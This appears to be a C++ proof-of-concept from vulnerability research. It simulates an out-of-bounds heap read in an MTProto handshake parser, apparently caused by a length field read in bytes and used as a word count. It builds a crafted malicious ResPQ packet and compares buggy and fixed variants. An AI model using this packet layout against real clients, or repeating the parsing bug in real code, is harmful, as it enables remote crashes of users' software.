// F-2 remote-DoS PoC: faithful to the real ResPQ read path.
//
// Models a malicious plaintext-handshake reply delivered pre-auth (via a
// malicious DC / MITM / MTProto proxy) to readPQFakeReply -> parseNotSecureResponse
// -> MTPResPQ::read. Because parseNotSecureResponse (buggy) returns a span whose
// end is ~4x the real packet, the TL vector<long> read loop (tl_basic_types.h:547)
// walks far past the heap buffer -> OOB read. With a large packet the overrun is
// megabytes -> crosses into an unmapped page -> SIGSEGV in production (ASan faults
// at the first OOB byte here). The QVector allocation is kept small on purpose so
// the crash is the OOB READ, not the (separately-known) unbounded-count alloc-DoS.
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

using mtpPrime = int32_t;

// --- buggy parseNotSecureResponse tail (unit confusion) ---
static std::pair<const mtpPrime*, size_t> parseBuggy(const std::vector<mtpPrime>& buf) {
    const mtpPrime* answer = buf.data();
    const size_t len = buf.size();
    if (len < 6) return {nullptr, 0};
    const uint32_t answerLen = (uint32_t)answer[4];              // BYTE length
    if (answerLen < 1 || answerLen > (len - 5) * sizeof(mtpPrime)) return {nullptr, 0};
    return {answer + 5, (size_t)answerLen};                      // BUG: bytes as prime count
}

// Minimal faithful models of the TL readers (Has/Get bound by `end`).
struct Cur { const mtpPrime* from; const mtpPrime* end; };
static bool Has(Cur& c, size_t n) { return (size_t)(c.end - c.from) >= n; }
static uint32_t Get(Cur& c) { return (uint32_t)*c.from++; }      // reads *from  (OOB when from>=realEnd)

int main(int argc, char** argv) {
    const bool fixed = (argc > 1 && !strcmp(argv[1], "fixed"));
    const size_t len = 262144;                 // 1 MB plaintext handshake packet
    std::vector<mtpPrime> buf(len, 0);
    buf[0]=0; buf[1]=0; buf[2]=1; buf[3]=0;
    buf[4] = (mtpPrime)((len - 5) * sizeof(mtpPrime));   // answerLen = max (bytes)
    // ResPQ body at offset 5: id, nonce(4), server_nonce(4), pq(1 empty), vec id, count
    size_t o = 5;
    buf[o++] = (mtpPrime)0x05162463;           // resPQ id
    o += 4;                                     // nonce
    o += 4;                                     // server_nonce
    buf[o++] = 0;                               // pq: empty string (last byte 0)
    buf[o++] = (mtpPrime)0x1cb5c415;           // Vector id
    const uint32_t count = 600000;             // longs; forces the loop to walk past real end
    buf[o++] = (mtpPrime)count;

    // Build the (buggy or fixed) span end.
    const mtpPrime* answer = buf.data();
    size_t spanCount = fixed ? ((len - 5))            // fixed: answerLen/4 == len-5
                             : ((len - 5) * 4);       // buggy: answerLen bytes as prime count
    Cur c{ answer + 5, answer + 5 + spanCount };
    const mtpPrime* realEnd = buf.data() + buf.size();
    printf("variant=%s  packet=%zu primes  span_end=%+ld primes vs realEnd (overrun=%ld bytes)\n",
           fixed ? "FIXED" : "BUGGY", len,
           (long)((answer + 5 + spanCount) - realEnd),
           (long)(((answer + 5 + spanCount) - realEnd) * (long)sizeof(mtpPrime)));

    // Walk the ResPQ read exactly as the generated code would, bounded by c.end.
    c.from += 1 + 4 + 4;                        // id + nonce + server_nonce
    // pq string: last byte 0 -> empty, consumes the 1 prime already placed
    if (!Has(c,1)) { printf("handshake fails cleanly (no OOB)\n"); return 0; }
    c.from += 1;                                // pq prime
    if (!Has(c,1)) { printf("clean\n"); return 0; }
    /*vec id*/ c.from += 1;
    if (!Has(c,1)) { printf("clean\n"); return 0; }
    uint32_t n = Get(c);                        // vector count
    long acc = 0;
    for (uint32_t i = 0; i < n; ++i) {          // long_type::read: Has(2) then 2x Get
        if (!Has(c, 2)) break;                  // bounded by INFLATED end -> under-checks
        acc += (long)Get(c);                    // <-- OOB read once from crosses realEnd
        acc += (long)Get(c);
    }
    printf("walked vector, acc=%ld (no crash: overrun stayed in mapped heap)\n", acc);
    return 0;
}
